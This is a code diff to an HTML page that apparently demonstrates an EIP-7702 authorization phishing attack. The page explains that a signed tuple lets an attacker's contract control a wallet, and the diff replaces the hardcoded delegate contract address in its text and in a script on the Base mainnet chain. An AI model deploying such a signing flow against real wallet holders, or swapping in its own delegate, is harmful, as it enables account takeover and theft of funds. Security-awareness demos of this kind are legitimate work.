@@ -157,7 +157,7 @@
           You saw a generic signature request. The message looked like hex gibberish:
           <div class="code-block" id="authTupleDisplay"></div>
           But this wasn't random. It was an EIP-7702 authorization tuple:
-          <div class="code-block">[chain_id=8453, delegateAddress=0x4c60..., nonce=(currentNonce+1), y_parity, r, s]</div>
+          <div class="code-block">[chain_id=8453, delegateAddress=0xa57a96c76fec586be399f47437cca9fd81f08b92, nonce=(currentNonce+1), y_parity, r, s]</div>
           Signing this gave the attacker the authorization to attach their contract to your EOA.
         </div>
       </div>
@@ -192,7 +192,7 @@ tx = {
     </div>
     <div class="info-card">
       <div class="info-card-label">Delegate contract (now controls your EOA)</div>
-      <div class="info-card-value">0x4c6015c7058fEe725c7342cFF1E7Dbd94Ca9C72e</div>
+      <div class="info-card-value">0xa57a96c76fec586be399f47437cca9fd81f08b92</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">Signed authorization message (hex)</div>
@@ -229,7 +229,7 @@ tx = {
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
   const BASE_CHAIN_ID = 8453;
-  const DELEGATE_ADDRESS = "0x4c6015c7058fEe725c7342cFF1E7Dbd94Ca9C72e";
+  const DELEGATE_ADDRESS = "0xa57a96c76fec586be399f47437cca9fd81f08b92";
 
   let userAddress = null;
   let signedAuth = null;
